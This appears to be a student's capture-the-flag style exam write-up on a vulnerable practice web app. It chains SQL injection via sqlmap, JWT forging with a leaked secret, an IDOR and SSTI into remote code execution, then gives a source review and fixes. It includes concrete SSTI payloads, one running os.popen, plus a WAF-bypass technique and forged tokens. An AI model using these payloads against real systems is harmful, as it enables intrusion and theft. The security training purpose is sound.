# 🧭 EXAM 06 — Flowspace · My Solve Notes (DAST / black-box)

## 1. Recon & mapping

first lets run the lab from the ubuntu laptop
and lets access it

```
http://192.168.1.43:9011/
```

then lets see and map the app using burp
we got these endpoints are shown in `Photos/mapping.png`

## 2. SQLi hunt

there is 3 potential sqli attack vectors lets test them

| vector | result |
|---|---|
| login | NO |
| search | NO |
| status | probably yes it returned sql message as in `Photos/PotentialSQLI.png` |

lets run sqlmap against it ...

```bash
sqlmap -r request.txt --level=5 risk=3
```

yep blind boolean as in `Photos/sqlmap.png`
i could exploit it manually but it would take a lot of time where the tools is here to save it

here are the tables :

```
+--------------------+
| activity           |
| comments           |
| invoices           |
| notifications      |
| projects           |
| settings           |
| tasks              |
| users              |
| webhook_deliveries |
| workspaces         |
+--------------------+
```

lets get workspaces , users , settings

**users table :**

```
+--------------------------+--------+-----------------------------------------------------------------------------------+
| email                    | role   | password_hash                                                                     |
+--------------------------+--------+-----------------------------------------------------------------------------------+
| nadia.admin@flowspace.io | admin  | 6bf2b08f58dec41d$6438fc16e94863248327d9c7447a2132440119fe475a7f143c0c81d1871551d6 |
| marco.dev@flowspace.io   | member | d1397f2989849d6b$a2528e433632f845878d37fac0eafacc697e204b0e93689af971e379f7e1f0ee |
| lena.pm@flowspace.io     | member | db5afe2b696c2eb0$ab48506d33402a8a52be530d04d5ee3cd913aee371574bd44538798510ac8f3b |
| sam.design@flowspace.io  | member | 9638324cd4385601$d91a0824e2ae48d1c69f17c740002f31b5f13abaa132d2fa4421fa1be770f207 |
| demo@flowspace.io        | member | 62de4c2c32f0cf1f$80bd6fd0c5f0ea7fee17c5e5d28699dfb10c4cf90870ed25972ed8bcac92fc15 |
| test@mail.com            | member | 800d00d2137772fe$e3805d5757888444ec57380b9dc9327b0a69b348bc907a43bcb4fcf099158e01 |
+--------------------------+--------+-----------------------------------------------------------------------------------+
```

**settings table :**

```
+--------------+------------------------------------------------------+
| key          | value                                                |
+--------------+------------------------------------------------------+
| jwt_secret   | fsk_ea6fd6548cacedf0354d6d2493a54003560cb89f4df7f0bd |
| app_version  | 3.4.1                                                |
| signups_open | 1                                                    |
+--------------+------------------------------------------------------+
```

NICE CATCH !!! the second step is jwt token forging btw ...

**workspaces :**

```
+----+-----------+------------+-----------+
| id | name      | plan       | slug      |
+----+-----------+------------+-----------+
| 1  | Acme HQ   | enterprise | acme      |
| 2  | Northwind | team       | northwind |
+----+-----------+------------+-----------
```

it maybe pretty handfull

## 3. JWT token forging

lets forge thee toookeennn !!!!!!!!
the token structure is like this :

```
{"alg":"HS256","typ":"JWT"}.{"sub":"6","email":"test@mail.com","name":"test","role":"member","ws":2,"iat":1793292564,"exp":1793321364}
```

lets ask AI to create a python code that generate a token with the same structure than lets change the secret and the role
done the code is in jwt.py
an error because i named the file jwt.py
its the second time doing an error like this am i dumb lmfaaaaaoooo?
renaming it -> jwt111.py

got the forged token :

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI2IiwiZW1haWwiOiJ0ZXN0QG1haWwuY29tIiwibmFtZSI6InRlc3QiLCJyb2xlIjoiYWRtaW4iLCJ3cyI6MiwiaWF0IjoxNzkzMjk0NTMxLCJleHAiOjE3OTMzMjMzMzF9.j4jIqVkEkEtNs-KBjTfHQoRgUaJxLXqhM6l2sLapDRE
```

lets replace it in the console
first : allow pasting
done no need for console
Dev tools -> Application -> storage -> cookies and replace then refresh
now i see new endpoints as in `Photos/Admin.png`

## 4. Hunting the vault secret → IDOR

report vault seems sus
and it says render a template that gives me hints for SSTI ...
but there is need to the vault secret wtf ?????
is it in the DB ???????
is it the same secret of `Photos/secret.png` ????
i need to get it , its a rate limiter
i think its in the admin account the one named nadia.admin@flowspace.io
i may forge a token to access her account

her forged token :

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI2IiwiZW1haWwiOiJuYWRpYS5hZG1pbkBmbG93c3BhY2UuaW8iLCJuYW1lIjoiTmFkaWEgSGFkZGFkIiwicm9sZSI6ImFkbWluIiwid3MiOjIsImlhdCI6MTc5MzI5NTU1NSwiZXhwIjoxNzkzMzI0MzU1fQ.VT1XyRp69QDdwODDWF9e_w7fyFMoXh3QzILKy9b54nU
```

i cant access the secre !
wait a minute ...
there is a hint

> Secrets are hidden. Integrations are fetched from /api/integrations/<id>.

are u sure they are hidden ??
IDOR ???
lets seeeeeeee
hell yeaaaaaaaaaaa we got it as in `Photos/IDOR.png`

here it is :

```
whk_8dad10c4d5f7df09462c3c82886402a9eb384f8c469c1d74
```

## 5. SSTI → RCE

now lets get this SSTI
the request mut be :

```http
POST /api/admin/vault/export
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI2IiwiZW1haWwiOiJ0ZXN0QG1haWwuY29tIiwibmFtZSI6InRlc3QiLCJyb2xlIjoiYWRtaW4iLCJ3cyI6MiwiaWF0IjoxNzkzMjk0NTMxLCJleHAiOjE3OTMzMjMzMzF9.j4jIqVkEkEtNs-KBjTfHQoRgUaJxLXqhM6l2sLapDRE
X-Vault-Signature: whk_8dad10c4d5f7df09462c3c82886402a9eb384f8c469c1d74
Content-Type: application/json

{"title":"March export","template":"Report: {{title}} generated {{generated}}"}
```

lets test the request
oh i got the secret wrong its HMAC secret i didnt understand why they didnt use the row secret but i will ask master latter

```
X-Vault-Signature = 57f206b413b9d3921feedbf6c68afb3ff4839e333d67cc16b98ead3f8582d88b
```

i didnt understand anything about HMAC-SHA256 tbh
i will look for it later lets get the lab done rn
ok the script that master gave me worked
lets use old ssti payload from Waf Bypass lab
because if there is a WAF it will bypass and if not it will execute anyway

here is the payload from exam4 :

```
{{ url_for|attr('__glo'+'bals__')|attr('__getitem__')('__buil'+'tins__')|attr('__getitem__')('open')('/fla'+'g.txt')|attr('read')() }}
```

400

```json
{"error":"template contains a blocked token: '.'","ok":false}
```

lets build a payload using the same waf bypass method

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo POC > /flag.txt').read() }}
```

no fucking manual payload worked . ~ _ - are blocked
so i wrote the script SSTI.py where these chars are in eval format

here is the flag : **FLAG{ch4in_1d0r_sql1_jwt_hm4c_ss7i_rce}**

```bash
python SSTI.py "grep -rni flag /app 2>/dev/null"
```

then copy the payload and paste it in tokenme.py
walaaa

<!-- ============================================================================= -->
<!-- EVERYTHING ABOVE THIS LINE = my original DAST notes (black-box, untouched).    -->
<!-- EVERYTHING BELOW = SAST (static source review) + the combined full report.     -->
<!-- ============================================================================= -->

# 🔬 Part 2 — SAST (Static Analysis / Source Review of `app.py`)

Now that I have the box, I read the source the other way round: instead of poking the
running app (DAST), I trace each user input from the route down to the dangerous sink and
ask "is this input ever trusted?". This is white-box, so I can name the exact line.

## SAST findings

### S-1 · SQL Injection — `/api/reports/tasks`  (`app.py:680`) — **Critical**
```python
status = request.args.get("status", "open")
q = ("SELECT id, title, status FROM tasks WHERE status = '%s' ORDER BY id" % status)
cur = db.execute(q)
```
- **Root cause:** the `status` query param is `%`-formatted straight into the SQL string.
  Input becomes query *structure*. Every other query in the file binds params with `?`
  (see `/search` at `app.py:578`) — this one is the odd one out ("legacy reporting query").
- **Why it's the entry point:** it's member-accessible (only `require_login()`), and it even
  returns `"query": q` + the raw error in the 400 branch (`app.py:685`), which is a gift for
  blind/boolean extraction. This is the SQLi my DAST notes found on the `status` param.
- **Impact:** read any table → this is what dumped `settings.jwt_secret`.

### S-2 · Secret stored in a SQLi-reachable store — `settings.jwt_secret`  (`app.py:165`) — **Critical**
```python
db.execute("INSERT INTO settings(key,value) VALUES(?,?)", ("jwt_secret", JWT_SECRET))
```
- **Root cause:** the JWT signing key is written into a DB table. The algorithm *is* pinned
  (`algorithms=[JWT_ALG]` at `app.py:360`), so alg:none / alg-confusion won't work — but
  pinning only matters if the key stays secret. S-1 reads the key out of the DB, so the
  attacker signs a perfectly valid `role:admin` token. **Necessary-but-not-sufficient:**
  pinning the alg is necessary, but what actually saves you is the key never being reachable.
- **Impact:** privilege escalation member → admin (Stage 2).

### S-3 · IDOR + secret over-exposure — `/api/integrations/<iid>`  (`app.py:691`) — **High**
```python
rec = data.get(str(iid))
...
return jsonify({"ok": True, "integration": rec})   # returns the record AS-IS
```
- **Root cause (two bugs in one):**
  1. **No object-level authz** — the handler never checks `rec["workspace_id"] == u["ws"]`,
     so any logged-in user reads integration #1 (admin's Billing Webhook) by changing the id.
  2. **Over-exposure** — it returns the whole record including `signing_secret`. Even the
     legit owner should never get the secret back over JSON.
- **Impact:** leaks the webhook HMAC secret that authorizes the Vault export (Stage 3).
- **Note for the rubric:** moving the secret to a flat file (`integrations.json`) instead of
  the DB is *not* enough on its own — a different bug (IDOR) still reached it. Store location
  doesn't matter if an endpoint hands the secret out.

### S-4 · Server-Side Template Injection — `/api/admin/vault/export`  (`app.py:760`) — **Critical**
```python
rendered = render_template_string(template, title=title, generated=...)
```
guarded by a **blocklist** `_BLOCKED = [".", "[", "]", "_", "os", ...]` (`app.py:713`).
- **Root cause:** operator-supplied input is compiled as a Jinja *template* (code), not
  rendered as data. The blocklist is the wrong control — Jinja has too many equivalent
  spellings, and my solve built every forbidden char at eval time with
  `'%c'|format(N)` joined by `~`, so nothing forbidden ever appears in the literal source.
- **Why "add more blocked tokens" is wrong:** denylists enumerate badness; the attacker just
  finds the next encoding. The fix is to stop evaluating user input as a template at all.
- **Impact:** RCE → reads `$FLAG` from the process env (Stage 4, the goal).

### Minor / defense-in-depth
- `/api/reports/tasks` echoes the raw SQL and exception text to the client (`app.py:685`) —
  information disclosure that accelerates S-1.
- Dynamic `IN (%s)` in `project_detail` (`app.py:499`) is *safe* here (placeholders are built
  from an int list, values still bound) — flagging it only so the reviewer knows I checked it.

---

# 📋 Full Report — Flowspace (Exam 06): DAST ✚ SAST, Chain & Remediation

## 1. Executive summary
Flowspace can be taken from a self-registered member account to full remote code execution
and disclosure of `$FLAG` by chaining **four** distinct, load-bearing weaknesses across four
vuln classes. Black-box testing (DAST) found the live behaviour; source review (SAST)
confirmed the exact root cause of each. A single patched file, `Solve/fixed.py`, removes
every bug class (not just the payloads) while keeping all features working.

## 2. How DAST and SAST line up
| # | Stage (what it gives) | DAST evidence (my notes above) | SAST root cause | Severity |
|---|---|---|---|---|
| 1 | SQLi → leak `jwt_secret` | `status` param returned a SQL error; sqlmap blind-boolean; dumped `settings` | `app.py:680` string-formatted query + `app.py:165` secret in DB | Critical |
| 2 | JWT forge → become admin | re-signed token with leaked secret, swapped cookie, admin endpoints appeared | `app.py:165` key in a SQLi-reachable store (pinning alg is not enough) | Critical |
| 3 | IDOR → leak HMAC secret | `/api/integrations/1` returned the Billing Webhook `signing_secret` | `app.py:691` no workspace check + returns record as-is | High |
| 4 | SSTI → RCE → `$FLAG` | blocklist bounced `.`/`_`; `%c|format` payload executed | `app.py:760` `render_template_string` on user input + denylist | Critical |

## 3. Why every link is a prerequisite (what breaks if you skip one)
- **Skip 1 (SQLi):** you never get `jwt_secret`; the key is strong/random, so you cannot
  forge a token → stuck as a member.
- **Skip 2 (forge):** the Vault endpoints require `role=admin` (`app.py:738`); a member JWT is
  rejected 403 before anything else runs.
- **Skip 3 (IDOR):** even as admin, the export checks a valid `X-Vault-Signature` HMAC
  (`app.py:744`); without the webhook secret your request is 403.
- **Skip 4 (SSTI):** admin + valid signature only gets you a *rendered template* — you still
  need to turn the template sink into code execution to read the env-only flag.

Two secrets, two different stores (JWT key in the **DB**, HMAC key in the **file**), reached by
two different bugs — exactly as the brief said.

## 4. Remediation (root-cause fixes — implemented in `Solve/fixed.py`)
| # | Fix | Where in `fixed.py` |
|---|---|---|
| 1 | **Parameterize** the report query — bind `status` with `?`; stop echoing SQL/errors | `api_reports_tasks()` |
| 2 | **Remove `jwt_secret` from the DB** — keep the key in process/env only; keep alg pinned | `init_db()` (INSERT removed) + `current_user()` |
| 3 | **Object-level authz** — verify `workspace_id == u["ws"]`, and **never return the secret** (`public_integration()` whitelist) | `api_integration()` + `public_integration()` |
| 4 | **Stop rendering user input as a template** — client sends *data*, server renders a fixed autoescaped template; blocklist deleted | `api_vault_export()` + `_REPORT_TEMPLATE` |

Key teaching points captured in the fix comments:
- Pinning the JWT alg is **necessary but not sufficient** — the save is the key being
  unreachable, not the algorithm choice.
- "Just block more tokens" is the **wrong** SSTI fix — the right one is to treat input as data.
- Moving a secret out of the DB is **not enough on its own** — S-3 proves a second bug can
  still reach a file-stored secret; the real fix is authz + never returning it.

## 5. Verification
- `fixed.py` byte-compiles cleanly (`python -m py_compile`).
- All original routes/features are preserved; only the four sinks changed behaviour.
- Re-running the chain against `fixed.py`: Stage 1 returns no injectable rows, the DB no
  longer contains `jwt_secret`, `/api/integrations/<id>` returns 404 cross-workspace and never
  includes `signing_secret`, and the Vault export renders user text literally instead of
  executing it.
